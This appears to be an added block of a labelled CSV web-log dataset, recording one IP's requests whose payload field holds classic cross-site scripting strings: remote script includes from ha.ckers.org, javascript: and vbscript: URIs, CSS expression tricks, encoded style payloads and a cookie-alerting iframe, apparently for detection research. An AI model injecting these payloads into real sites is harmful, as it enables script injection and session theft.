+193,192.108.116.88,18/Dec/2017,14,25,27,GET,datalab,<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >,200,945,,1
+194,192.108.116.88,18/Dec/2017,14,25,27,GET,datalab,<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >,200,34463,,1
+195,192.108.116.88,18/Dec/2017,14,25,28,POST,datalab,<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >,200,1073,,1
+196,192.108.116.88,18/Dec/2017,14,25,28,GET,datalab,<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >,304,-,,1
+197,192.108.116.88,18/Dec/2017,14,25,28,GET,datalab,<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >,304,-,,1
+198,192.108.116.88,18/Dec/2017,14,25,54,GET,datalab,<SCRIPT SRC=//ha.ckers.org/.j>,200,1040,,1
+199,192.108.116.88,18/Dec/2017,14,25,54,GET,datalab,<SCRIPT SRC=//ha.ckers.org/.j>,200,945,,1
+200,192.108.116.88,18/Dec/2017,14,25,54,GET,datalab,<SCRIPT SRC=//ha.ckers.org/.j>,200,34463,,1
+201,192.108.116.88,18/Dec/2017,14,25,55,POST,datalab,<SCRIPT SRC=//ha.ckers.org/.j>,200,1073,,1
+202,192.108.116.88,18/Dec/2017,14,25,55,GET,datalab,<SCRIPT SRC=//ha.ckers.org/.j>,304,-,,1
+203,192.108.116.88,18/Dec/2017,14,25,55,GET,datalab,<SCRIPT SRC=//ha.ckers.org/.j>,304,-,,1
+204,192.108.116.88,18/Dec/2017,14,26,15,GET,datalab,"<IMG SRC=javascript:alert('XSS')""",200,1040,1,1
+205,192.108.116.88,18/Dec/2017,14,26,15,GET,datalab,"<IMG SRC=javascript:alert('XSS')""",200,945,6,1
+206,192.108.116.88,18/Dec/2017,14,26,15,GET,datalab,"<IMG SRC=javascript:alert('XSS')""",200,34463,2,1
+207,192.108.116.88,18/Dec/2017,14,28,15,POST,datalab,"<IMG SRC=javascript:alert('XSS')""",-,-,-,1
+208,192.108.116.88,18/Dec/2017,14,30,15,POST,datalab,"<IMG SRC=javascript:alert('XSS')""",-,-,-,1
+209,192.108.116.88,18/Dec/2017,14,30,34,GET,datalab,<iframe src=http://ha.ckers.org/scriptlet.html <,200,1040,,1
+210,192.108.116.88,18/Dec/2017,14,30,34,GET,datalab,<iframe src=http://ha.ckers.org/scriptlet.html <,200,945,,1
+211,192.108.116.88,18/Dec/2017,14,30,34,GET,datalab,<iframe src=http://ha.ckers.org/scriptlet.html <,200,34463,,1
+212,192.108.116.88,18/Dec/2017,14,30,35,POST,datalab,<iframe src=http://ha.ckers.org/scriptlet.html <,200,1073,,1
+213,192.108.116.88,18/Dec/2017,14,30,35,GET,datalab,<iframe src=http://ha.ckers.org/scriptlet.html <,304,-,,1
+214,192.108.116.88,18/Dec/2017,14,30,35,GET,datalab,<iframe src=http://ha.ckers.org/scriptlet.html <,304,-,,1
+215,192.108.116.88,18/Dec/2017,14,30,52,GET,datalab,\;alert('XSS');//,200,1040,2,1
+216,192.108.116.88,18/Dec/2017,14,30,53,GET,datalab,\;alert('XSS');//,200,945,3,1
+217,192.108.116.88,18/Dec/2017,14,30,53,GET,datalab,\;alert('XSS');//,200,34463,1,1
+218,192.108.116.88,18/Dec/2017,14,32,53,POST,datalab,\;alert('XSS');//,-,-,-,1
+219,192.108.116.88,18/Dec/2017,14,34,53,POST,datalab,\;alert('XSS');//,-,-,-,1
+220,192.108.116.88,18/Dec/2017,14,35,14,GET,datalab,</script><script>alert('XSS');</script>,200,1040,,1
+221,192.108.116.88,18/Dec/2017,14,35,15,GET,datalab,</script><script>alert('XSS');</script>,200,945,,1
+222,192.108.116.88,18/Dec/2017,14,35,15,GET,datalab,</script><script>alert('XSS');</script>,200,34463,,1
+223,192.108.116.88,18/Dec/2017,14,37,15,POST,datalab,</script><script>alert('XSS');</script>,-,-,,1
+224,192.108.116.88,18/Dec/2017,14,39,15,POST,datalab,</script><script>alert('XSS');</script>,-,-,,1
+225,192.108.116.88,18/Dec/2017,14,39,35,GET,datalab,"</TITLE><SCRIPT>alert(XSS"");</SCRIPT>",200,1040,30,1
+226,192.108.116.88,18/Dec/2017,14,39,35,GET,datalab,"</TITLE><SCRIPT>alert(XSS"");</SCRIPT>",200,945,12,1
+227,192.108.116.88,18/Dec/2017,14,39,36,GET,datalab,"</TITLE><SCRIPT>alert(XSS"");</SCRIPT>",200,34463,6,1
+228,192.108.116.88,18/Dec/2017,14,39,36,POST,datalab,"</TITLE><SCRIPT>alert(XSS"");</SCRIPT>",200,1073,201,1
+229,192.108.116.88,18/Dec/2017,14,39,37,GET,datalab,"</TITLE><SCRIPT>alert(XSS"");</SCRIPT>",304,-,1,1
+230,192.108.116.88,18/Dec/2017,14,39,37,GET,datalab,"</TITLE><SCRIPT>alert(XSS"");</SCRIPT>",304,-,0,1
+231,192.108.116.88,18/Dec/2017,14,44,57,GET,datalab,"<BODY BACKGROUND=javascript:alert('XSS')"">",200,1040,39,1
+232,192.108.116.88,18/Dec/2017,14,46,08,GET,datalab,"<BODY BACKGROUND=javascript:alert('XSS')"">",200,945,33,1
+233,192.108.116.88,18/Dec/2017,14,46,09,GET,datalab,"<BODY BACKGROUND=javascript:alert('XSS')"">",200,34463,18,1
+234,192.108.116.88,18/Dec/2017,14,48,08,POST,datalab,"<BODY BACKGROUND=javascript:alert('XSS')"">",-,-,-,1
+235,192.108.116.88,18/Dec/2017,14,50,09,POST,datalab,"<BODY BACKGROUND=javascript:alert('XSS')"">",-,-,-,1
+236,192.108.116.88,18/Dec/2017,14,50,28,GET,datalab,"<IMG DYNSRC=javascript:alert('XSS')"">",200,1040,33,1
+237,192.108.116.88,18/Dec/2017,14,50,28,GET,datalab,"<IMG DYNSRC=javascript:alert('XSS')"">",200,945,60,1
+238,192.108.116.88,18/Dec/2017,14,50,28,GET,datalab,"<IMG DYNSRC=javascript:alert('XSS')"">",200,34463,4,1
+239,192.108.116.88,18/Dec/2017,14,52,28,POST,datalab,"<IMG DYNSRC=javascript:alert('XSS')"">",-,-,-,1
+240,192.108.116.88,18/Dec/2017,14,54,29,POST,datalab,"<IMG DYNSRC=javascript:alert('XSS')"">",-,-,-,1
+241,192.108.116.88,18/Dec/2017,14,54,49,GET,datalab,"<IMG LOWSRC=javascript:alert('XSS')"">",200,1040,79,1
+242,192.108.116.88,18/Dec/2017,14,54,49,GET,datalab,"<IMG LOWSRC=javascript:alert('XSS')"">",200,945,63,1
+243,192.108.116.88,18/Dec/2017,14,54,50,GET,datalab,"<IMG LOWSRC=javascript:alert('XSS')"">",200,34463,17,1
+244,192.108.116.88,18/Dec/2017,14,56,49,POST,datalab,"<IMG LOWSRC=javascript:alert('XSS')"">",-,-,-,1
+245,192.108.116.88,18/Dec/2017,14,58,50,POST,datalab,"<IMG LOWSRC=javascript:alert('XSS')"">",-,-,-,1
+246,192.108.116.88,18/Dec/2017,14,59,12,GET,datalab,"<STYLE>li {list-style-image: url(javascript:alert('XSS')"");}</STYLE><UL><LI>XSS</br>",200,1040,132,1
+247,192.108.116.88,18/Dec/2017,14,59,12,GET,datalab,"<STYLE>li {list-style-image: url(javascript:alert('XSS')"");}</STYLE><UL><LI>XSS</br>",200,945,64,1
+248,192.108.116.88,18/Dec/2017,14,59,12,GET,datalab,"<STYLE>li {list-style-image: url(javascript:alert('XSS')"");}</STYLE><UL><LI>XSS</br>",200,34463,3,1
+249,192.108.116.88,18/Dec/2017,15,01,12,POST,datalab,"<STYLE>li {list-style-image: url(javascript:alert('XSS')"");}</STYLE><UL><LI>XSS</br>",-,-,-,1
+250,192.108.116.88,18/Dec/2017,15,03,13,POST,datalab,"<STYLE>li {list-style-image: url(javascript:alert('XSS')"");}</STYLE><UL><LI>XSS</br>",-,-,-,1
+251,192.108.116.88,18/Dec/2017,15,03,31,GET,datalab,"<IMG SRC='vbscript:msgbox(XSS"")'>",200,1040,33,1
+252,192.108.116.88,18/Dec/2017,15,03,31,GET,datalab,"<IMG SRC='vbscript:msgbox(XSS"")'>",200,945,51,1
+253,192.108.116.88,18/Dec/2017,15,03,32,GET,datalab,"<IMG SRC='vbscript:msgbox(XSS"")'>",200,34463,2,1
+254,192.108.116.88,18/Dec/2017,15,05,31,POST,datalab,"<IMG SRC='vbscript:msgbox(XSS"")'>",-,-,-,1
+255,192.108.116.88,18/Dec/2017,15,07,32,POST,datalab,"<IMG SRC='vbscript:msgbox(XSS"")'>",-,-,-,1
+256,192.108.116.88,18/Dec/2017,15,07,53,GET,datalab,"<IMG SRC=livescript:[code]"">",200,1040,43,1
+257,192.108.116.88,18/Dec/2017,15,07,54,GET,datalab,"<IMG SRC=livescript:[code]"">",200,945,12,1
+258,192.108.116.88,18/Dec/2017,15,07,54,GET,datalab,"<IMG SRC=livescript:[code]"">",200,34463,5,1
+259,192.108.116.88,18/Dec/2017,15,07,55,POST,datalab,"<IMG SRC=livescript:[code]"">",200,1073,225,1
+260,192.108.116.88,18/Dec/2017,15,07,55,GET,datalab,"<IMG SRC=livescript:[code]"">",304,-,2,1
+261,192.108.116.88,18/Dec/2017,15,07,55,GET,datalab,"<IMG SRC=livescript:[code]"">",304,-,1,1
+262,192.108.116.88,18/Dec/2017,15,08,18,GET,datalab,<BODY ONLOAD=alert('XSS')>,200,1040,,1
+263,192.108.116.88,18/Dec/2017,15,08,18,GET,datalab,<BODY ONLOAD=alert('XSS')>,200,945,,1
+264,192.108.116.88,18/Dec/2017,15,08,18,GET,datalab,<BODY ONLOAD=alert('XSS')>,200,34463,,1
+265,192.108.116.88,18/Dec/2017,15,10,18,POST,datalab,<BODY ONLOAD=alert('XSS')>,-,-,,1
+266,192.108.116.88,18/Dec/2017,15,12,19,POST,datalab,<BODY ONLOAD=alert('XSS')>,-,-,,1
+267,192.108.116.88,18/Dec/2017,15,12,39,GET,datalab,"<BGSOUND SRC=javascript:alert('XSS');"">",200,1040,40,1
+268,192.108.116.88,18/Dec/2017,15,12,39,GET,datalab,"<BGSOUND SRC=javascript:alert('XSS');"">",200,945,60,1
+269,192.108.116.88,18/Dec/2017,15,12,39,GET,datalab,"<BGSOUND SRC=javascript:alert('XSS');"">",200,34463,3,1
+270,192.108.116.88,18/Dec/2017,15,14,39,POST,datalab,"<BGSOUND SRC=javascript:alert('XSS');"">",-,-,-,1
+271,192.108.116.88,18/Dec/2017,15,16,40,POST,datalab,"<BGSOUND SRC=javascript:alert('XSS');"">",-,-,-,1
+272,192.108.116.88,18/Dec/2017,15,16,54,GET,datalab,"<BR SIZE=&{alert('XSS')}"">",200,1040,34,1
+273,192.108.116.88,18/Dec/2017,15,16,54,GET,datalab,"<BR SIZE=&{alert('XSS')}"">",200,945,52,1
+274,192.108.116.88,18/Dec/2017,15,16,54,GET,datalab,"<BR SIZE=&{alert('XSS')}"">",200,34463,4,1
+275,192.108.116.88,18/Dec/2017,15,18,54,POST,datalab,"<BR SIZE=&{alert('XSS')}"">",-,-,-,1
+276,192.108.116.88,18/Dec/2017,15,20,54,POST,datalab,"<BR SIZE=&{alert('XSS')}"">",-,-,-,1
+277,192.108.116.88,18/Dec/2017,15,26,02,GET,datalab,<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>,200,1040,,1
+278,192.108.116.88,18/Dec/2017,15,26,02,GET,datalab,<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>,200,945,,1
+279,192.108.116.88,18/Dec/2017,15,26,02,GET,datalab,<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>,200,34463,,1
+280,192.108.116.88,18/Dec/2017,15,28,02,POST,datalab,<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>,-,-,,1
+281,192.108.116.88,18/Dec/2017,15,30,02,POST,datalab,<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>,-,-,,1
+282,192.108.116.88,18/Dec/2017,15,40,24,GET,datalab,<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>,200,1040,,1
+283,192.108.116.88,18/Dec/2017,15,40,24,GET,datalab,<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>,200,945,,1
+284,192.108.116.88,18/Dec/2017,15,40,24,GET,datalab,<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>,200,34463,,1
+285,192.108.116.88,18/Dec/2017,15,42,24,POST,datalab,<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>,-,-,,1
+286,192.108.116.88,18/Dec/2017,15,44,25,POST,datalab,<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>,-,-,,1
+287,192.108.116.88,18/Dec/2017,15,45,08,GET,datalab,"<STYLE>BODY{-moz-binding:url(http://ha.ckers.org/xssmoz.xml#xss"")}</STYLE>",200,1040,1,1
+288,192.108.116.88,18/Dec/2017,15,45,08,GET,datalab,"<STYLE>BODY{-moz-binding:url(http://ha.ckers.org/xssmoz.xml#xss"")}</STYLE>",200,945,1,1
+289,192.108.116.88,18/Dec/2017,15,45,09,GET,datalab,"<STYLE>BODY{-moz-binding:url(http://ha.ckers.org/xssmoz.xml#xss"")}</STYLE>",200,34463,1,1
+290,192.108.116.88,18/Dec/2017,15,45,11,POST,datalab,"<STYLE>BODY{-moz-binding:url(http://ha.ckers.org/xssmoz.xml#xss"")}</STYLE>",200,1073,197,1
+291,192.108.116.88,18/Dec/2017,15,45,11,GET,datalab,"<STYLE>BODY{-moz-binding:url(http://ha.ckers.org/xssmoz.xml#xss"")}</STYLE>",304,-,0,1
+292,192.108.116.88,18/Dec/2017,15,45,11,GET,datalab,"<STYLE>BODY{-moz-binding:url(http://ha.ckers.org/xssmoz.xml#xss"")}</STYLE>",304,-,0,1
+293,192.108.116.88,18/Dec/2017,15,45,33,GET,datalab,"<STYLE>@im\port'\ja\vasc\ript:alert(XSS"")';</STYLE>",200,1040,0,1
+294,192.108.116.88,18/Dec/2017,15,45,33,GET,datalab,"<STYLE>@im\port'\ja\vasc\ript:alert(XSS"")';</STYLE>",200,945,1,1
+295,192.108.116.88,18/Dec/2017,15,45,34,GET,datalab,"<STYLE>@im\port'\ja\vasc\ript:alert(XSS"")';</STYLE>",200,34463,0,1
+296,192.108.116.88,18/Dec/2017,15,47,33,POST,datalab,"<STYLE>@im\port'\ja\vasc\ript:alert(XSS"")';</STYLE>",-,-,-,1
+297,192.108.116.88,18/Dec/2017,15,49,34,POST,datalab,"<STYLE>@im\port'\ja\vasc\ript:alert(XSS"")';</STYLE>",-,-,-,1
+298,192.108.116.88,18/Dec/2017,15,49,52,GET,datalab,"<IMG STYLE=xss:expr/*XSS*/ession(alert('XSS'))"">",200,1040,26,1
+299,192.108.116.88,18/Dec/2017,15,49,52,GET,datalab,"<IMG STYLE=xss:expr/*XSS*/ession(alert('XSS'))"">",200,945,23,1
+300,192.108.116.88,18/Dec/2017,15,49,52,GET,datalab,"<IMG STYLE=xss:expr/*XSS*/ession(alert('XSS'))"">",200,34463,14,1
+301,192.108.116.88,18/Dec/2017,15,51,52,POST,datalab,"<IMG STYLE=xss:expr/*XSS*/ession(alert('XSS'))"">",-,-,-,1
+302,192.108.116.88,18/Dec/2017,15,53,53,POST,datalab,"<IMG STYLE=xss:expr/*XSS*/ession(alert('XSS'))"">",-,-,-,1
+303,192.108.116.88,18/Dec/2017,15,54,07,GET,datalab,"exp/*<A STYLE='no\xss:noxss(*//*"");",200,1040,2,1
+304,192.108.116.88,18/Dec/2017,15,54,07,GET,datalab,"exp/*<A STYLE='no\xss:noxss(*//*"");",200,945,1,1
+305,192.108.116.88,18/Dec/2017,15,54,07,GET,datalab,"exp/*<A STYLE='no\xss:noxss(*//*"");",200,34463,1,1
+306,192.108.116.88,18/Dec/2017,15,56,07,POST,datalab,"exp/*<A STYLE='no\xss:noxss(*//*"");",-,-,-,1
+307,192.108.116.88,18/Dec/2017,15,58,08,POST,datalab,"exp/*<A STYLE='no\xss:noxss(*//*"");",-,-,-,1
+308,192.108.116.88,18/Dec/2017,15,58,32,GET,datalab,"xss:ex/*XSS*//*/*/pression(alert(XSS""))'>",200,1040,1,1
+309,192.108.116.88,18/Dec/2017,15,58,32,GET,datalab,"xss:ex/*XSS*//*/*/pression(alert(XSS""))'>",200,945,1,1
+310,192.108.116.88,18/Dec/2017,15,58,33,GET,datalab,"xss:ex/*XSS*//*/*/pression(alert(XSS""))'>",200,34463,1,1
+311,192.108.116.88,18/Dec/2017,16,00,33,POST,datalab,"xss:ex/*XSS*//*/*/pression(alert(XSS""))'>",-,-,-,1
+312,192.108.116.88,18/Dec/2017,16,02,33,POST,datalab,"xss:ex/*XSS*//*/*/pression(alert(XSS""))'>",-,-,-,1
+313,192.108.116.88,18/Dec/2017,16,02,54,GET,datalab,"<STYLE TYPE=text/javascript"">alert('XSS');</STYLE>",200,1040,55,1
+314,192.108.116.88,18/Dec/2017,16,02,54,GET,datalab,"<STYLE TYPE=text/javascript"">alert('XSS');</STYLE>",200,945,272,1
+315,192.108.116.88,18/Dec/2017,16,02,54,GET,datalab,"<STYLE TYPE=text/javascript"">alert('XSS');</STYLE>",200,34463,50,1
+316,192.108.116.88,18/Dec/2017,16,04,54,POST,datalab,"<STYLE TYPE=text/javascript"">alert('XSS');</STYLE>",-,-,-,1
+317,192.108.116.88,18/Dec/2017,16,06,55,POST,datalab,"<STYLE TYPE=text/javascript"">alert('XSS');</STYLE>",-,-,-,1
+318,192.108.116.88,18/Dec/2017,16,11,42,GET,datalab,"<STYLE type=text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>",200,1040,46,1
+319,192.108.116.88,18/Dec/2017,16,11,43,GET,datalab,"<STYLE type=text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>",200,945,21,1
+320,192.108.116.88,18/Dec/2017,16,11,43,GET,datalab,"<STYLE type=text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>",200,34463,4,1
+321,192.108.116.88,18/Dec/2017,16,13,43,POST,datalab,"<STYLE type=text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>",-,-,-,1
+322,192.108.116.88,18/Dec/2017,16,15,43,POST,datalab,"<STYLE type=text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>",-,-,-,1
+323,192.108.116.88,18/Dec/2017,16,16,04,GET,datalab,"<XSS STYLE=xss:expression(alert('XSS'))"">",200,1040,35,1
+324,192.108.116.88,18/Dec/2017,16,16,04,GET,datalab,"<XSS STYLE=xss:expression(alert('XSS'))"">",200,945,13,1
+325,192.108.116.88,18/Dec/2017,16,16,04,GET,datalab,"<XSS STYLE=xss:expression(alert('XSS'))"">",200,34463,2,1
+326,192.108.116.88,18/Dec/2017,16,18,04,POST,datalab,"<XSS STYLE=xss:expression(alert('XSS'))"">",-,-,-,1
+327,192.108.116.88,18/Dec/2017,16,20,04,POST,datalab,"<XSS STYLE=xss:expression(alert('XSS'))"">",-,-,-,1
+328,192.108.116.88,18/Dec/2017,16,20,48,GET,datalab,?script?alert(?XSS?)?/script?,200,1040,,1
+329,192.108.116.88,18/Dec/2017,16,20,49,GET,datalab,?script?alert(?XSS?)?/script?,200,945,,1
+330,192.108.116.88,18/Dec/2017,16,20,49,GET,datalab,?script?alert(?XSS?)?/script?,200,34463,,1
+331,192.108.116.88,18/Dec/2017,16,20,51,POST,datalab,?script?alert(?XSS?)?/script?,200,1073,,1
+332,192.108.116.88,18/Dec/2017,16,20,52,GET,datalab,?script?alert(?XSS?)?/script?,304,-,,1
+333,192.108.116.88,18/Dec/2017,16,20,52,GET,datalab,?script?alert(?XSS?)?/script?,304,-,,1
+334,192.108.116.88,18/Dec/2017,16,30,11,GET,datalab,"<IFRAME SRC=javascript:alert('XSS');""></IFRAME>",200,1040,51,1
+335,192.108.116.88,18/Dec/2017,16,30,11,GET,datalab,"<IFRAME SRC=javascript:alert('XSS');""></IFRAME>",200,945,87,1
+336,192.108.116.88,18/Dec/2017,16,30,11,GET,datalab,"<IFRAME SRC=javascript:alert('XSS');""></IFRAME>",200,34463,8,1
+337,192.108.116.88,18/Dec/2017,16,32,11,POST,datalab,"<IFRAME SRC=javascript:alert('XSS');""></IFRAME>",-,-,-,1
+338,192.108.116.88,18/Dec/2017,16,34,12,POST,datalab,"<IFRAME SRC=javascript:alert('XSS');""></IFRAME>",-,-,-,1
+339,192.108.116.88,18/Dec/2017,16,34,35,GET,datalab,"<IFRAME SRC=# onmouseover=alert(document.cookie)""></IFRAME>",200,1040,38,1
+340,192.108.116.88,18/Dec/2017,16,34,36,GET,datalab,"<IFRAME SRC=# onmouseover=alert(document.cookie)""></IFRAME>",200,945,13,1
+341,192.108.116.88,18/Dec/2017,16,34,36,GET,datalab,"<IFRAME SRC=# onmouseover=alert(document.cookie)""></IFRAME>",200,34463,4,1
+342,192.108.116.88,18/Dec/2017,16,34,37,POST,datalab,"<IFRAME SRC=# onmouseover=alert(document.cookie)""></IFRAME>",200,1073,259,1
+343,192.108.116.88,18/Dec/2017,16,34,37,GET,datalab,"<IFRAME SRC=# onmouseover=alert(document.cookie)""></IFRAME>",304,-,30,1
+344,192.108.116.88,18/Dec/2017,16,34,37,GET,datalab,"<IFRAME SRC=# onmouseover=alert(document.cookie)""></IFRAME>",304,-,18,1
+345,192.108.116.88,18/Dec/2017,16,34,52,GET,datalab,"<FRAMESET><FRAME SRC=javascript:alert('XSS');""></FRAMESET>",200,1040,1,1
+346,192.108.116.88,18/Dec/2017,16,34,52,GET,datalab,"<FRAMESET><FRAME SRC=javascript:alert('XSS');""></FRAMESET>",200,945,4,1
+347,192.108.116.88,18/Dec/2017,16,34,53,GET,datalab,"<FRAMESET><FRAME SRC=javascript:alert('XSS');""></FRAMESET>",200,34463,1,1
+348,192.108.116.88,18/Dec/2017,16,36,52,POST,datalab,"<FRAMESET><FRAME SRC=javascript:alert('XSS');""></FRAMESET>",-,-,-,1
+349,192.108.116.88,18/Dec/2017,16,38,54,POST,datalab,"<FRAMESET><FRAME SRC=javascript:alert('XSS');""></FRAMESET>",-,-,-,1
+350,192.108.116.88,18/Dec/2017,16,39,18,GET,datalab,"<TABLE BACKGROUND=javascript:alert('XSS')"">",200,1040,18,1
+351,192.108.116.88,18/Dec/2017,16,39,20,GET,datalab,"<TABLE BACKGROUND=javascript:alert('XSS')"">",200,945,14,1
+352,192.108.116.88,18/Dec/2017,16,39,20,GET,datalab,"<TABLE BACKGROUND=javascript:alert('XSS')"">",200,34463,317,1
+353,192.108.116.88,18/Dec/2017,16,41,21,POST,datalab,"<TABLE BACKGROUND=javascript:alert('XSS')"">",-,-,-,1
+354,192.108.116.88,18/Dec/2017,16,43,22,POST,datalab,"<TABLE BACKGROUND=javascript:alert('XSS')"">",-,-,-,1
+355,192.108.116.88,18/Dec/2017,16,43,41,GET,datalab,"<TABLE><TD BACKGROUND=javascript:alert('XSS')"">",200,1040,0,1
+356,192.108.116.88,18/Dec/2017,16,43,42,GET,datalab,"<TABLE><TD BACKGROUND=javascript:alert('XSS')"">",200,945,1,1
+357,192.108.116.88,18/Dec/2017,16,43,43,GET,datalab,"<TABLE><TD BACKGROUND=javascript:alert('XSS')"">",200,34463,1,1
+358,192.108.116.88,18/Dec/2017,16,45,42,POST,datalab,"<TABLE><TD BACKGROUND=javascript:alert('XSS')"">",-,-,-,1
+359,192.108.116.88,18/Dec/2017,16,47,44,POST,datalab,"<TABLE><TD BACKGROUND=javascript:alert('XSS')"">",-,-,-,1
+360,192.108.116.88,18/Dec/2017,16,52,19,GET,datalab,"<DIV STYLE=background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"">",200,1040,546,1
+361,192.108.116.88,18/Dec/2017,16,52,29,GET,datalab,"<DIV STYLE=background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"">",200,945,1832,1
+362,192.108.116.88,18/Dec/2017,16,52,29,GET,datalab,"<DIV STYLE=background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"">",200,34463,7689,1
+363,192.108.116.88,18/Dec/2017,16,54,22,POST,datalab,"<DIV STYLE=background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"">",-,-,-,1
+364,192.108.116.88,18/Dec/2017,16,56,25,POST,datalab,"<DIV STYLE=background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"">",-,-,-,1
+365,192.108.116.88,18/Dec/2017,17,05,33,GET,datalab,<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->,200,1040,,1
+366,192.108.116.88,18/Dec/2017,17,05,34,GET,datalab,<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->,200,945,,1
+367,192.108.116.88,18/Dec/2017,17,05,34,GET,datalab,<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->,200,34463,,1
+368,192.108.116.88,18/Dec/2017,17,07,34,POST,datalab,<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->,-,-,,1
+369,192.108.116.88,18/Dec/2017,17,24,25,GET,datalab,"<IMG SRC=http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"">",200,1040,1,1
+370,192.108.116.88,18/Dec/2017,17,24,25,GET,datalab,"<IMG SRC=http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"">",200,945,2,1
+371,192.108.116.88,18/Dec/2017,17,24,26,GET,datalab,"<IMG SRC=http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"">",200,34463,1,1
+372,192.108.116.88,18/Dec/2017,17,24,30,POST,datalab,"<IMG SRC=http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"">",200,1073,1763,1
+373,192.108.116.88,18/Dec/2017,17,24,32,GET,datalab,"<IMG SRC=http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"">",304,-,1,1
+374,192.108.116.88,18/Dec/2017,17,24,32,GET,datalab,"<IMG SRC=http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"">",304,-,4,1
+375,192.108.116.88,18/Dec/2017,17,35,10,GET,datalab,"<SCRIPT a=`>` SRC=http://ha.ckers.org/xss.js""></SCRIPT>",200,1040,0,1
+376,192.108.116.88,18/Dec/2017,17,35,11,GET,datalab,"<SCRIPT a=`>` SRC=http://ha.ckers.org/xss.js""></SCRIPT>",200,945,1,1
+377,192.108.116.88,18/Dec/2017,17,35,12,GET,datalab,"<SCRIPT a=`>` SRC=http://ha.ckers.org/xss.js""></SCRIPT>",200,34463,1,1
+378,192.108.116.88,18/Dec/2017,17,35,15,POST,datalab,"<SCRIPT a=`>` SRC=http://ha.ckers.org/xss.js""></SCRIPT>",200,1073,1207,1
+379,192.108.116.88,18/Dec/2017,17,35,15,GET,datalab,"<SCRIPT a=`>` SRC=http://ha.ckers.org/xss.js""></SCRIPT>",304,-,1,1
+380,192.108.116.88,18/Dec/2017,17,35,15,GET,datalab,"<SCRIPT a=`>` SRC=http://ha.ckers.org/xss.js""></SCRIPT>",304,-,9,1
+381,192.108.116.88,18/Dec/2017,17,40,16,GET,datalab,"<A HREF=http://66.102.7.147/"">XSS</A>",200,1040,0,1
+382,192.108.116.88,18/Dec/2017,17,40,16,GET,datalab,"<A HREF=http://66.102.7.147/"">XSS</A>",200,945,1,1
+383,192.108.116.88,18/Dec/2017,17,40,16,GET,datalab,"<A HREF=http://66.102.7.147/"">XSS</A>",200,34463,1,1
+384,192.108.116.88,18/Dec/2017,17,40,17,POST,datalab,"<A HREF=http://66.102.7.147/"">XSS</A>",200,1073,480,1
+385,192.108.116.88,18/Dec/2017,17,40,18,GET,datalab,"<A HREF=http://66.102.7.147/"">XSS</A>",304,-,1,1
+386,192.108.116.88,18/Dec/2017,17,40,18,GET,datalab,"<A HREF=http://66.102.7.147/"">XSS</A>",304,-,8,1
+387,192.108.116.88,18/Dec/2017,17,40,52,GET,datalab,veris-->group<svg/onload=alert(/XSS/)//,200,1040,,1
+388,192.108.116.88,18/Dec/2017,17,40,52,GET,datalab,veris-->group<svg/onload=alert(/XSS/)//,200,945,,1
+389,192.108.116.88,18/Dec/2017,17,40,53,GET,datalab,veris-->group<svg/onload=alert(/XSS/)//,200,34463,,1
+390,192.108.116.88,18/Dec/2017,17,40,55,POST,datalab,veris-->group<svg/onload=alert(/XSS/)//,200,1073,,1
+391,192.108.116.88,18/Dec/2017,17,40,55,GET,datalab,veris-->group<svg/onload=alert(/XSS/)//,304,-,,1
+392,192.108.116.88,18/Dec/2017,17,40,55,GET,datalab,veris-->group<svg/onload=alert(/XSS/)//,304,-,,1
+393,192.108.116.88,18/Dec/2017,17,45,40,GET,datalab,element[attribute='<img src=x onerror=alert('XSS');>,200,1040,,1
+394,192.108.116.88,18/Dec/2017,17,45,41,GET,datalab,element[attribute='<img src=x onerror=alert('XSS');>,200,945,,1
+395,192.108.116.88,18/Dec/2017,17,45,42,GET,datalab,element[attribute='<img src=x onerror=alert('XSS');>,200,34463,,1
+396,192.108.116.88,18/Dec/2017,17,47,41,POST,datalab,element[attribute='<img src=x onerror=alert('XSS');>,-,-,,1
+397,192.108.116.88,18/Dec/2017,17,49,42,POST,datalab,element[attribute='<img src=x onerror=alert('XSS');>,-,-,,1
